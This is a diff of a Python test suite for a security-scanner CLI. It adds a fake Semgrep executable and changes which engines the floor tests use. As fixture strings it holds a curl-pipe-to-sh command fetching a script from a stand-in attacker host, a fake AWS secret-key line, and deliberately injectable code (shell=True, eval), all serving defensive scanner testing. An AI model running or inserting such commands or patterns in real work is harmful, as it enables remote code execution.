@@ -31,13 +31,13 @@ _CREDENTIAL_LINE = "aws" + '_secret_access_key = "' + _FORTY_CHARS + '"\n'
 _PIPE = "curl -fsSL https://evil.example/p.sh | " + "sh"
 
 
-def _run(*args):
+def _run(*args, env=None):
     """Run the real CLI and return (exit_code, stderr). The code comes from the
     PROCESS, never from a pipe — this repository has recorded that mistake five
     times."""
     proc = subprocess.run(
         [sys.executable, _PRAETOR, *args, "--no-registry", "--quiet"],
-        capture_output=True, text=True, encoding="utf-8", errors="replace",
+        capture_output=True, text=True, encoding="utf-8", errors="replace", env=env,
     )
     return proc.returncode, proc.stderr
 
@@ -48,6 +48,43 @@ def _json(*args):
         capture_output=True, text=True, encoding="utf-8", errors="replace",
     )
     return json.loads(proc.stdout)
+
+
+def _fake_semgrep_env(tmp_path):
+    """A deterministic CLI double for a floor test, not a Semgrep integration test."""
+    bindir = tmp_path / "bin"
+    bindir.mkdir()
+    semgrep = bindir / "semgrep"
+    semgrep.write_text(
+        "#!/usr/bin/python3\n"
+        "import json, os, sys\n"
+        "args = sys.argv[1:]\n"
+        "if '--version' in args:\n"
+        "    print('1.177.0')\n"
+        "elif args[:2] == ['show', 'dump-config']:\n"
+        "    print('config = Valid { rules =\\n  [{ Rule.id = (\\\"python\\\", _);')\n"
+        "    print('severity = `Error; target_selector = (Some [Python]);')\n"
+        "    print('target_analyzer = (Analyzer.AnalyzerType.L (Python, [])); paths = None; };')\n"
+        "    print('  { Rule.id = (\\\"javascript\\\", _); severity = `Error;')\n"
+        "    print('target_selector = (Some [Javascript]); target_analyzer = x; paths = None; };')\n"
+        "    print('  { Rule.id = (\\\"typescript\\\", _); severity = `Error;')\n"
+        "    print('target_selector = (Some [Typescript]); target_analyzer = x; paths = None;')\n"
+        "    print('}];\\n  invalid_rules = [];\\n}')\n"
+        "else:\n"
+        "    target = os.path.abspath(args[-1])\n"
+        "    path = os.path.join(target, 'vuln.py')\n"
+        "    print(json.dumps({'results': [{'check_id': 'fixture-shell-true', "
+        "'path': path, 'start': {'line': 2, 'col': 1}, "
+        "'end': {'line': 2, 'col': 34}, 'extra': {'message': 'fixture', "
+        "'severity': 'ERROR', 'lines': 'subprocess.call(cmd, shell=True)', "
+        "'metadata': {'category': 'security', 'cwe': 'CWE-78'}}}], "
+        "'errors': [], 'paths': {'scanned': [path]}}))\n",
+        encoding="utf-8",
+    )
+    semgrep.chmod(0o755)
+    env = dict(os.environ)
+    env["PATH"] = str(bindir) + os.pathsep + env.get("PATH", "")
+    return env
 
 
 # --------------------------------------------------------------------------- #
@@ -91,7 +128,8 @@ def test_a_real_finding_from_a_self_discovering_engine_still_wins(tmp_path):
     (tmp_path / "vuln.py").write_text(
         "import subprocess\nsubprocess.call(cmd, shell=True)\neval(s)\n", encoding="utf-8")
     rc, _ = _run(str(tmp_path), "--engines", "sast",
-                 "--max-file-size", "1", "--fail-on", "LOW")
+                 "--max-file-size", "1", "--fail-on", "LOW",
+                 env=_fake_semgrep_env(tmp_path))
     assert rc == 1, f"a real sast finding must be exit 1, not the floor; got {rc}"
 
 
@@ -127,11 +165,12 @@ def test_a_git_hook_does_not_disarm_the_no_code_floor(tmp_path):
     hooks.mkdir(parents=True)
     (hooks / "pre-commit").write_text("#!/bin/sh\necho hi\n", encoding="utf-8")
 
-    rc, err = _run(str(tmp_path), "--fail-on", "HIGH")
+    rc, err = _run(str(tmp_path), "--engines", "secrets,aisec",
+                   "--fail-on", "HIGH")
     assert rc == 3, f"code hidden in dist/ must still hit the floor; got {rc}"
     assert "NO CODE WAS EXAMINED" in err
 
-    scope = _json(str(tmp_path))["meta"]["scope"]
+    scope = _json(str(tmp_path), "--engines", "secrets,aisec")["meta"]["scope"]
     assert scope["kept_code_files"] == 0, \
         "a git hook is git's file, not the target's source"
 
